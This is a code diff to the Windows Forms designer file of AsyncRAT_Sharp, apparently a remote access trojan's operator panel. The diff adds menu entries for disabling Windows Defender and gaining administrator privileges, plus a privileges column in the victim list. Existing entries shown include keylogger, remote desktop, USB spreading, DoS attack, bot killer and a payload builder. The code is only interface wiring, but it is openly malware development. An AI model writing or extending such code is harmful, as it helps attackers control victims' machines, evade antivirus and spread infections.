@@ -38,6 +38,7 @@
             this.lv_os = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lv_version = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lv_prefor = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.lv_admin = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
             this.cLIENTOPTIONSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.cLOSEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -51,15 +52,18 @@
             this.sENDFILETOMEMORYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.rEMOTEDESKTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.kEYLOGGERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.fILEMANAGERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.pROCESSMANAGERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.dISABLESToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.wINDOWDSDEFENDERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.bOTKILLERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.uSBSPREADToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.gETADMINISTRATORPRIVILEGESToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
             this.bUILDERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
             this.aBOUTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.statusStrip1 = new System.Windows.Forms.StatusStrip();
             this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
             this.ping = new System.Windows.Forms.Timer(this.components);
@@ -103,7 +107,8 @@
             this.lv_user,
             this.lv_os,
             this.lv_version,
-            this.lv_prefor});
+            this.lv_prefor,
+            this.lv_admin});
             this.listView1.ContextMenuStrip = this.contextMenuStrip1;
             this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
             this.listView1.FullRowSelect = true;
@@ -154,6 +159,11 @@
             this.lv_prefor.Text = "PERFORMANCE";
             this.lv_prefor.Width = 170;
             // 
+            // lv_admin
+            // 
+            this.lv_admin.Text = "PRIVILEGES";
+            this.lv_admin.Width = 138;
+            // 
             // contextMenuStrip1
             // 
             this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
@@ -169,14 +179,16 @@
             this.toolStripMenuItem1,
             this.fILEMANAGERToolStripMenuItem,
             this.pROCESSMANAGERToolStripMenuItem,
+            this.dISABLESToolStripMenuItem,
             this.bOTKILLERToolStripMenuItem,
             this.uSBSPREADToolStripMenuItem,
+            this.gETADMINISTRATORPRIVILEGESToolStripMenuItem,
             this.toolStripSeparator2,
             this.bUILDERToolStripMenuItem,
             this.toolStripSeparator3,
             this.aBOUTToolStripMenuItem});
             this.contextMenuStrip1.Name = "contextMenuStrip1";
-            this.contextMenuStrip1.Size = new System.Drawing.Size(283, 442);
+            this.contextMenuStrip1.Size = new System.Drawing.Size(283, 502);
             // 
             // cLIENTOPTIONSToolStripMenuItem
             // 
@@ -271,6 +283,14 @@
             this.kEYLOGGERToolStripMenuItem.Text = "KEYLOGGER";
             this.kEYLOGGERToolStripMenuItem.Click += new System.EventHandler(this.KEYLOGGERToolStripMenuItem_Click);
             // 
+            // toolStripMenuItem1
+            // 
+            this.toolStripMenuItem1.Image = global::AsyncRAT_Sharp.Properties.Resources.ddos;
+            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
+            this.toolStripMenuItem1.Size = new System.Drawing.Size(282, 30);
+            this.toolStripMenuItem1.Text = "DOS ATTACK";
+            this.toolStripMenuItem1.Click += new System.EventHandler(this.ToolStripMenuItem1_Click);
+            // 
             // fILEMANAGERToolStripMenuItem
             // 
             this.fILEMANAGERToolStripMenuItem.Image = global::AsyncRAT_Sharp.Properties.Resources.filemanager;
@@ -287,6 +307,22 @@
             this.pROCESSMANAGERToolStripMenuItem.Text = "PROCESS MANAGER";
             this.pROCESSMANAGERToolStripMenuItem.Click += new System.EventHandler(this.pROCESSMANAGERToolStripMenuItem_Click);
             // 
+            // dISABLESToolStripMenuItem
+            // 
+            this.dISABLESToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.wINDOWDSDEFENDERToolStripMenuItem});
+            this.dISABLESToolStripMenuItem.Image = global::AsyncRAT_Sharp.Properties.Resources.disabled;
+            this.dISABLESToolStripMenuItem.Name = "dISABLESToolStripMenuItem";
+            this.dISABLESToolStripMenuItem.Size = new System.Drawing.Size(282, 30);
+            this.dISABLESToolStripMenuItem.Text = "DISABLES";
+            // 
+            // wINDOWDSDEFENDERToolStripMenuItem
+            // 
+            this.wINDOWDSDEFENDERToolStripMenuItem.Name = "wINDOWDSDEFENDERToolStripMenuItem";
+            this.wINDOWDSDEFENDERToolStripMenuItem.Size = new System.Drawing.Size(289, 30);
+            this.wINDOWDSDEFENDERToolStripMenuItem.Text = "WINDOWDS DEFENDER";
+            this.wINDOWDSDEFENDERToolStripMenuItem.Click += new System.EventHandler(this.WINDOWDSDEFENDERToolStripMenuItem_Click);
+            // 
             // bOTKILLERToolStripMenuItem
             // 
             this.bOTKILLERToolStripMenuItem.Image = global::AsyncRAT_Sharp.Properties.Resources.botkiller;
@@ -302,6 +338,14 @@
             this.uSBSPREADToolStripMenuItem.Size = new System.Drawing.Size(282, 30);
             this.uSBSPREADToolStripMenuItem.Text = "USB SPREAD";
             this.uSBSPREADToolStripMenuItem.Click += new System.EventHandler(this.USBSPREADToolStripMenuItem_Click);
+            // 
+            // gETADMINISTRATORPRIVILEGESToolStripMenuItem
+            // 
+            this.gETADMINISTRATORPRIVILEGESToolStripMenuItem.Image = global::AsyncRAT_Sharp.Properties.Resources.uac;
+            this.gETADMINISTRATORPRIVILEGESToolStripMenuItem.Name = "gETADMINISTRATORPRIVILEGESToolStripMenuItem";
+            this.gETADMINISTRATORPRIVILEGESToolStripMenuItem.Size = new System.Drawing.Size(282, 30);
+            this.gETADMINISTRATORPRIVILEGESToolStripMenuItem.Text = "GET ADMIN PRIVILEGES";
+            this.gETADMINISTRATORPRIVILEGESToolStripMenuItem.Click += new System.EventHandler(this.GETADMINISTRATORPRIVILEGESToolStripMenuItem_Click);
             // 
             // toolStripSeparator2
             // 
@@ -328,14 +372,6 @@
             this.aBOUTToolStripMenuItem.Size = new System.Drawing.Size(282, 30);
             this.aBOUTToolStripMenuItem.Text = "ABOUT";
             this.aBOUTToolStripMenuItem.Click += new System.EventHandler(this.ABOUTToolStripMenuItem_Click);
-            // 
-            // toolStripMenuItem1
-            // 
-            this.toolStripMenuItem1.Image = global::AsyncRAT_Sharp.Properties.Resources.ddos;
-            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
-            this.toolStripMenuItem1.Size = new System.Drawing.Size(282, 30);
-            this.toolStripMenuItem1.Text = "DOS ATTACK";
-            this.toolStripMenuItem1.Click += new System.EventHandler(this.ToolStripMenuItem1_Click);
             // 
             // statusStrip1
             // 
@@ -598,6 +634,10 @@
         private System.Windows.Forms.ContextMenuStrip contextMenuStrip3;
         private System.Windows.Forms.ToolStripMenuItem notificationOFFToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem dISABLESToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem wINDOWDSDEFENDERToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem gETADMINISTRATORPRIVILEGESToolStripMenuItem;
+        private System.Windows.Forms.ColumnHeader lv_admin;
     }
 }
 
